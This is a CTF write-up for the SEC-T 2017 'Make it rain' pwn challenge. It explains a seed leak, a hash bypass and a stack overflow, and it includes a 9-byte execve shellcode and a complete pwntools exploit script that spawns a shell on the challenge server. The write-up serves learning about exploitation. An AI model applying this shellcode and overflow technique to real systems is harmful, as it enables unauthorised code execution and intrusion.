---
layout: post
title:  "SEC-T CTF 2017 - Make it rain"
date:   2017-09-15 22:00
categories: CTF
tags: [SECTCTF2017]
categories: [pwn]
author: jbz
---
> Joey: Like four hours I'm just messing around in there. Finally I figure out, that it's a bank. Right, okay wait, okay, so it's a bank. So, this morning, I look in the paper, some cash machine in like Bumsville Idaho, spits out seven hundred dollars into the middle of the street.

This was a 250 points pwn challenge, I had a fun time solving it. In general this CTF was very fun and had very unique challenges. Plus the "Hackers" theme was awesome :)

Let's start with the usual initial recon on the binary, which is available [here](https://github.com/jbzteam/CTF/raw/master/SECTCTF2017/makeitrain/bank_15e31e6a4b5f7f89b03af4ddb8132879):

```bash
 $ file bank_15e31e6a4b5f7f89b03af4ddb8132879 
bank_15e31e6a4b5f7f89b03af4ddb8132879: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b60e073fa58bf97db29158b394480023f21e0aba, not stripped
 $ checksec bank_15e31e6a4b5f7f89b03af4ddb8132879 
[*] './bank_15e31e6a4b5f7f89b03af4ddb8132879'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

Almost all mitigations on... fun stuff. Let's see how it works with IDA. Keep in mind that I tend to clean-up/fix stuff so your output might be different.

`main()` is pretty easy, it only calls four functions:
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  init();
  login();
  create_secret();
  menu();
}
```
Let's do a quick overview of all the functions. We'll check their details as needed throughout the write-up:
- `init()`: after the usual couple of `setvbuf()` calls, it  reads 4 bytes from `/dev/urandom`, writes them in the variable `rand_data` in `.bss`, and uses that value as argument for `srand()`.
- `login()` reads a 9 bytes string in the `.bss` variable `username`, which is 8 bytes long and located right before `rand_data`. Duh!
- `create_secret()` allocates 200000 bytes of memory at `0x40000`, copies 9 bytes from `username`at the beginning of that memory segment, and fills the rest with random numbers. The memory at `0x40000` is `rx`, and becomes writeable only when things are written into it.
- `menu()` the meat of the program.

After this premise, let's see what the program actually does. This is the initial banner + menu:
```
BANK OF AMERICA (BOA)
Welcome <username>
===============
1) Change user
2) Make it rain!
3) Exit
```

`<username>` is the string we supplied in `login()`. It's easy to guess that if we supply a 8 byte string, when the variable is printed it will also print the value of `rand_data` as `username` is not null-terminated and, as said, is right before `rand_data` in `.bss`. Great, we can leak the `srand()` seed... we'll need it later!

Change user is pretty self-explanatory, we'll need this later as well.

Let's see what that "Make it rain" does:
```c
ssize_t __fastcall make_it_rain(__int64 a1, __int64 a2)
{
  verify_secure_hash();
  return withdraw();
}
```

`verify_secure_hash()` computes the SHA256 hash of the mapped memory area at `0x40000`, and compares it with an user-supplied hash. If they match, `withdraw()` is executed, which tries to fill a 16-byte array with 150 bytes. Here's our vuln! To access that code though, we need to pass the hash check. Fortunately we have all we need to do that, as we can leak the value of `rand_data`!

So let's plan our attack. We have to:
- leak `rand_data`
- pre-compute all the 200000 bytes at `0x40000` and SHA256-hash them
- pass hash validation part
- exploit the stack overflow vuln
- PROFIT!

As said, to leak `rand_data` we just have to provide a 8-byte string as the `username`. Easy peasy.

To pre-compute all the random numbers, I created a small C program that does it for me. I chose C to make sure that `rand()` behaved in the same way as the target program. My code takes the `rand_data` and `username` as input and spits all the 200000 bytes out, which can then be hashed. This is the source:
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char **argv) {
	if (argc < 3) {
		printf("fail\n");
		return 1;
	}
	char *username = argv[1];
	int seed = atoi(argv[2]);
	char *username2 = "\x53\x56\x5f\x5e\xb0\x3b\x99\x0f\x05";
	char buffer[200000];
	char *buffer_ptr;
	char *c;
	int i;
	srand(seed);
	strncpy(buffer, username, 8);
	buffer[8] = (char)seed;
	buffer_ptr = &buffer[9];
	for ( i = 0; i <= 199990; ++i )
	{
		c = &buffer_ptr[i];
		*c = rand();
	}
	memcpy(buffer, username2, 9);
	write(1, buffer, sizeof(buffer));
	return 0;
}
```

I'll tell you what `username2` is in a moment ;)

With the stack overflow vuln we can control `RIP`. But we have no libc leaks, the binary is PIE and there's NX... what to do? Well, remember that "Change username"? `username` fills the first 8 (actually 9) bytes of the memory at `0x40000`, so we can control an executable area of memory at a static address. How about putting a shellcode right there? You say 9 bytes are too small for a shellcode? Naah :) When the `ret` executes in `withdraw()`, the `rsi` register points to the string we just passed, and we can use it to store our "/bin/sh". So we only need to set the registers correctly to have a working shellcode:
```asm
push rbx # which is 0
push rsi # wich points to "/bin/sh"
pop rdi
pop rsi
mov al, 0x3b
cdq
syscall
```

Encoded, the shellcode is `53565f5eb03b990f05`: exactly 9 bytes. Looks familiar? Yes, it's the `username2` variable in the C code above. Since that values is at the beginning of the memory segment at `0x40000`, we need it to calculate the correct SHA256 hash.

Once everything is set, we overwrite our `RIP` with `0x40000` and the shellcode executes.

This is the final python code:
```python
from pwn import *
import subprocess

#p = process("./bank_15e31e6a4b5f7f89b03af4ddb8132879")
p = remote("pwn.sect.ctf.rocks", 31337)

username = "aaaaaaaa"
username2 = "53565f5eb03b990f05".decode("hex") # asm -f hex -c amd64 "push rbx; push rsi; pop rdi; pop rsi; mov al, 0x3b; cdq; syscall"
mapped = 0x00040000

# Leaking rand_data
# I could've used the shellcode here directly but I did this challenges in two phases and I didn't want to re-write the whole thing :)
p.sendafter("Username:", username)
leak = p.recvuntil("===").split(username)[1].split("\x0a")[0]
leak_int = u32(leak)
log.info("leak {} {}".format(leak.encode("hex"), leak_int))

# Changing username to our shellcode
p.sendafter("#>", "1")
p.sendafter(":", username2)
# yes I'm lazy... :)
sha256 = subprocess.check_output("./generate_random '%s' '%s' | sha256sum | cut -f1 -d' '" % (username, leak_int), shell=True)
log.info("sha256: {}".format(sha256))

# Passing the hash and exploiting the stack overflow
p.sendafter("#>", "2")
p.sendafter(":", sha256.strip())
p.sendafter("?:", "/bin//sh\x00" + "x"*15 + p64(mapped))

# profit
p.sendline("uname -a && id")
p.interactive()
```

And the flag is `SECT{h0p3_y0u_d1dnt_d0_th1s_fr0m_yoUr_HOUSE}`.

Happy hacking!
